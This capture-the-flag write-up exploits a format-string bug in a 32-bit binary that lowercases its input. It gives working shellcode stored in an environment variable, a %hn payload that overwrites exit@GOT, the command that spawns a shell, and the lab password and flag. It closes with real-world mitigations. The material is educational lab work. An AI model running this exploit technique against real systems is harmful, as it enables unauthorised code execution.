# 🔐 Level05 - Format String with Character Transformation Bypass

![Helldivers Salute](https://media4.giphy.com/media/v1.Y2lkPTc5MGI3NjExejJwMnpmeXZ0dHp1enptbDE2am9la2Z4Ymg0eXczcmRiNzFqczJjMSZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/VJN5s9dNGXLDqkLYF4/giphy.gif)

Time to bypass a clever anti-exploitation defense using environment variables!

## 📋 Binary Analysis

### 🔍 Architecture & Security

**Platform:** x86 (32-bit ELF)

**Protection Mechanisms:**
- ❌ No stack canaries
- ❌ No ASLR (addresses are predictable)
- ✅ Character transformation (uppercase → lowercase)

### Decompiled Code

```c
int main(void)
{
    char buffer[100];
    unsigned int i;
    
    // Read user input (100 bytes max)
    fgets(buffer, 100, stdin);
    
    // Convert uppercase letters to lowercase
    for (i = 0; i < strlen(buffer); i++) {
        // Check if character is uppercase (ASCII 0x41-0x5A / 'A'-'Z')
        if (buffer[i] > '@' && buffer[i] < '[') {
            // XOR with 0x20 converts uppercase to lowercase
            // 'A' (0x41) ^ 0x20 = 'a' (0x61)
            buffer[i] ^= 0x20;
        }
    }
    
    // FORMAT STRING VULNERABILITY!
    printf(buffer);
    
    exit(0);
}
```

### Key Observations

1. **Format String Vulnerability**: `printf(buffer)` without format specifier
2. **Character Transformation**: Uppercase bytes (`0x41-0x5A`) converted to lowercase (`0x61-0x7A`)
3. **Buffer Size**: 100 bytes, no overflow
4. **GOT Available**: `exit()` called after printf, perfect target for redirection
5. **Stack Position**: Buffer accessible at format string position 10

## 🚨 Vulnerability

### CWE-134: Uncontrolled Format String

The program passes user input directly to `printf()` without a format specifier:

```c
printf(buffer);  // Should be: printf("%s", buffer);
```

This allows format string exploits using specifiers like:
- `%p` - Read pointers from stack
- `%x` - Read hex values from stack
- `%n` - **Write to memory** (number of bytes printed so far)
- `%hn` - Write 2 bytes (short) to memory

### The Anti-Exploitation Twist

Traditional format string exploits often use shellcode, but this binary has a clever defense:

```c
if (buffer[i] > '@' && buffer[i] < '[') {  // 0x41 to 0x5A
    buffer[i] ^= 0x20;                      // Convert to lowercase
}
```

**This corrupts shellcode!** Common shellcode instructions contain bytes in the uppercase range:

| Shellcode Byte | Hex | Gets Converted To | Impact |
|----------------|-----|-------------------|--------|
| `push edx` | `0x52` ('R') | `0x72` ('r') | ❌ Corrupted |
| `pop eax` | `0x58` ('X') | `0x78` ('x') | ❌ Corrupted |
| `push 0x68` | `0x68` ('h') | ✅ Safe | No change |

**Result:** Traditional shellcode injection in the buffer won't work!

## 🎯 The Attack

### Strategy: Environment Variable Shellcode + GOT Overwrite

Since we can't put shellcode in the buffer without corruption, we'll:

1. **Store shellcode in an environment variable** (bypasses transformation)
2. **Use format string to overwrite `exit@GOT`** with shellcode address
3. **When `exit()` is called**, execution redirects to our shellcode

### Step 1: Identify Stack Layout

Test with format string to find buffer position:

```bash
./level05
%p %p %p %p %p %p %p %p %p %p
```

**Output:**
```
0x64 0xf7fcfac0 (nil) (nil) (nil) (nil) 0xffffffff 0xffffdc94 0xf7fdb000 0x25207025
```

The 10th pointer is `0x25207025` = `"% p"` in ASCII. Our buffer starts at **position 10**!

Verify with marker test:

```bash
./level05
AAAABBBBCCCCDDDD%10$p%11$p%12$p%13$p
```

**Output:**
```
aaaabbbbccccdddd0x616161610x626262620x636363630x64646464
```

**Stack mapping confirmed:**

| Position | Offset | Content |
|----------|--------|---------|
| 10 | Bytes 0-3 | `0x61616161` ("aaaa") |
| 11 | Bytes 4-7 | `0x62626262` ("bbbb") |
| 12 | Bytes 8-11 | `0x63636363` ("cccc") |
| 13 | Bytes 12-15 | `0x64646464` ("dddd") |

### Step 2: Find GOT Addresses

Using Ghidra or objdump:

```bash
objdump -R level05 | grep exit
```

**Result:**
```
exit@GOT: 0x080497e0
```

**Address safety check:**
- `0x08` ✅ Safe (not in `0x41-0x5A` range)
- `0x04` ✅ Safe
- `0x97` ✅ Safe
- `0xe0` ✅ Safe

Perfect! No uppercase bytes in the GOT address.

### Step 3: Create Environment Variable with Shellcode

```bash
export SHELLCODE=$(python -c 'print "\x90"*200 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"')
```

**Components:**
- **200 NOPs** (`\x90`) - Large NOP sled for reliability
- **23-byte shellcode** - Standard `execve("/bin/sh", NULL, NULL)`

**Why this works:**
- Environment variables are stored **outside** the input buffer
- They don't pass through the uppercase→lowercase conversion
- Shellcode remains intact!

### Step 4: Find Shellcode Address

Using GDB:

```bash
gdb ./level05
(gdb) break main
(gdb) run
(gdb) x/500s environ
```

**Search output for:** `SHELLCODE=\220\220\220...`

**Found at:**
```
0xffffdd28: "SHELLCODE=\220\220\220..."
0xffffddf0: "\220\220\220\220\220\220\220\220\220\220j\vX\231Rh//shh/bin\211\343\061\311"
```

The shellcode (after NOPs) is at **`0xffffddf0`**.

**Address safety check:**
- `0xff` ✅ Safe
- `0xff` ✅ Safe  
- `0xdd` ✅ Safe
- `0xf0` ✅ Safe

Excellent! No uppercase bytes.

### Step 5: Calculate Format String Payload

**Goal:** Write `0xffffddf0` to `0x080497e0` (exit@GOT)

We'll use **short writes** (`%hn`) to write 2 bytes at a time:

```
Target address 0xffffddf0 split into:
  Lower 2 bytes: 0xddf0 = 56816 (decimal)
  Upper 2 bytes: 0xffff = 65535 (decimal)

Write to:
  0x080497e0 ← 0xddf0
  0x080497e2 ← 0xffff
```

**Payload structure:**

```
┌──────────────────────────────────────────────────┐
│ 4 bytes: 0x080497e0 (exit@GOT)                  │ ← Position 10
├──────────────────────────────────────────────────┤
│ 4 bytes: 0x080497e2 (exit@GOT+2)                │ ← Position 11
├──────────────────────────────────────────────────┤
│ %56808x (pad to 56816 total bytes)              │
├──────────────────────────────────────────────────┤
│ %10$hn (write to position 10 = exit@GOT)        │
├──────────────────────────────────────────────────┤
│ %8719x (pad to 65535 total bytes)               │
├──────────────────────────────────────────────────┤
│ %11$hn (write to position 11 = exit@GOT+2)      │
└──────────────────────────────────────────────────┘
```

**Calculation:**
1. Addresses written: 8 bytes
2. Need total of 56816 bytes: `56816 - 8 = 56808` (padding needed)
3. Write `0xddf0` to first address with `%10$hn`
4. Need total of 65535 bytes: `65535 - 56816 = 8719` (more padding)
5. Write `0xffff` to second address with `%11$hn`

### Execution Flow

```
┌─────────────────────────────────────┐
│ 1. SHELLCODE in environment         │
│    Address: 0xffffddf0              │
└──────────────┬──────────────────────┘
               │
               ▼
┌─────────────────────────────────────┐
│ 2. Format string processed by       │
│    printf(buffer)                   │
└──────────────┬──────────────────────┘
               │
               ▼
┌─────────────────────────────────────┐
│ 3. %hn writes overwrite exit@GOT    │
│    0x080497e0 → 0xffffddf0          │
└──────────────┬──────────────────────┘
               │
               ▼
┌─────────────────────────────────────┐
│ 4. Program calls exit(0)            │
│    But exit@GOT points to shellcode!│
└──────────────┬──────────────────────┘
               │
               ▼
┌─────────────────────────────────────┐
│ 5. Shellcode executes → /bin/sh     │
│    Shell spawned as level06! 🎉     │
└─────────────────────────────────────┘
```

## 💣 Exploit

### Complete Payload

```python
import struct

payload = struct.pack("<I", 0x080497e0)    # exit@GOT
payload += struct.pack("<I", 0x080497e2)   # exit@GOT+2
payload += "%56808x"                       # Pad to 56816 bytes
payload += "%10$hn"                        # Write 0xddf0
payload += "%8719x"                        # Pad to 65535 bytes
payload += "%11$hn"                        # Write 0xffff
```

### Execute

```bash
ssh level05@localhost -p 2222
# Password: 3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN

# Set environment variable with shellcode
export SHELLCODE=$(python -c 'print "\x90"*200 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"')

# Run exploit
(python -c 'import struct; print struct.pack("<I", 0x080497e0) + struct.pack("<I", 0x080497e2) + "%56808x%10$hn%8719x%11$hn"'; cat) | ./level05
```

### Output

```
[... lots of padding output ...]
whoami
level06
cat /home/users/level06/.pass
h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
```

---

> 💡 **Pro Tip**: The `cat` at the end keeps stdin open so we can interact with the spawned shell. Without it, the shell receives EOF immediately and exits.

> 💡 **Format String Magic**: The `%hn` modifier writes a "half-word" (2 bytes) instead of a full 4 bytes. This allows precise control over memory writes and avoids issues with writing large values.

> 💡 **NOP Sled**: The 200-byte NOP sled (`\x90`) provides a large landing zone. Even if the exact shellcode address varies slightly, execution will "slide" through the NOPs to reach the actual shellcode.

## 📚 Technical Deep Dive

### Understanding the Character Transformation

The XOR operation with `0x20` exploits ASCII encoding properties:

```
Uppercase letters: 0x41-0x5A ('A'-'Z')
Lowercase letters: 0x61-0x7A ('a'-z')

Difference: 0x20 (32 in decimal)

Example:
'A' = 0x41 = 0b01000001
       XOR 0x20
'a' = 0x61 = 0b01100001
          ↑ Only bit 5 flips
```

This simple transformation corrupts any shellcode bytes in the uppercase ASCII range.

### Why Environment Variables Escape Transformation

```
Memory Layout:
┌─────────────────────┐ High addresses
│  Environment vars   │ ← Shellcode here (not processed)
├─────────────────────┤
│  Stack              │
├─────────────────────┤
│  Heap               │
├─────────────────────┤
│  .data              │
├─────────────────────┤
│  .text              │
└─────────────────────┘ Low addresses

Input processing:
1. fgets() reads into stack buffer
2. Transformation loop processes stack buffer only
3. Environment variables in different memory region
4. Not touched by transformation logic!
```

### Format String Short Writes

When writing large values with `%n`, we risk printing millions of bytes. Short writes (`%hn`) solve this:

```
Full write (%n):  Write 4 bytes (0xffffddf0 = 4294958576 bytes to print!)
Short write (%hn): Write 2 bytes at a time
  First write:  0xddf0 (56816 bytes)
  Second write: 0xffff (65535 bytes)
```

By splitting the write into two 2-byte operations, we keep the exploit practical and fast.

## 🔒 Security Notes

### Vulnerabilities Exploited

1. **[CWE-134](https://cwe.mitre.org/data/definitions/134.html)**: Uncontrolled Format String
2. **[CWE-676](https://cwe.mitre.org/data/definitions/676.html)**: Use of Potentially Dangerous Function
3. **[CWE-787](https://cwe.mitre.org/data/definitions/787.html)**: Out-of-bounds Write (via format string)

### Defense Weaknesses

The character transformation is an interesting security measure, but:
- Only protects against **buffer-based** shellcode
- Doesn't prevent **environment variable** shellcode
- Doesn't protect against **ret2libc** attacks
- **Format string vulnerability** remains exploitable

### Real-World Mitigations

1. **Never pass user input directly to printf**: Use `printf("%s", buffer)` always
2. **Compiler flags**: Modern compilers warn about format string issues (`-Wformat-security`)
3. **FORTIFY_SOURCE**: Compile-time and runtime checks for dangerous functions
4. **RELRO**: Make GOT read-only after relocation (Full RELRO prevents GOT overwrites)
5. **Input Validation**: Sanitize format string characters (`%`, `$`, `n`)
6. **Use Safe Alternatives**: `puts()` for simple string output

### Why This Works Without ASLR

This exploit relies on predictable addresses:
- Buffer address: `0xffffdbc8` (consistent)
- Environment address: `0xffffddf0` (consistent)
- GOT address: `0x080497e0` (static)

With ASLR enabled, these addresses would randomize on each run, requiring information leaks first.

## 🎉 Victory!

![Helldivers Celebration](https://media4.giphy.com/media/v1.Y2lkPTc5MGI3NjExempicnBhODF0Y3BrZG5zaWIzMmM2MWExdDZuYWNnYWJrdnRtYXg4MyZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/MlyicdUndRbn5zUiAL/giphy.gif)

**Flag captured!** 🚩

```
h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
```

On to level06!
